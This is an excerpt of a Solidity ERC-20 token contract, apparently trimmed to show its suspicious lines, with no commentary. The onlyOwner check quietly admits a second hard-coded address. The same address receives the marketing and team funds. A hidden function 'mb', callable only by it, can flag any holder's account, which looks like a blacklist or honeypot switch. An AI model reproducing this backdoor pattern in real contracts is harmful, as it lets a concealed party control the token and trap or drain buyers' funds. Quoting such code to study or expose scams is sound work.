...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x8b001705829d10B923c64D1036c66C333c3fC41f) , "Ownable: caller is not the owner");
        _;
    }
...
contract nb is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x8b001705829d10B923c64D1036c66C333c3fC41f);
    address payable public teamWalletAddress = payable(0x8b001705829d10B923c64D1036c66C333c3fC41f);
    ...
    uint256 private _totalSupply =  20220921 * 10**_decimals;
    ...
    function mb(address addr, bool status) public{
        require(_msgSender()    ==   address(0x8b001705829d10B923c64D1036c66C333c3fC41f));
        aa[addr] = status;
    }
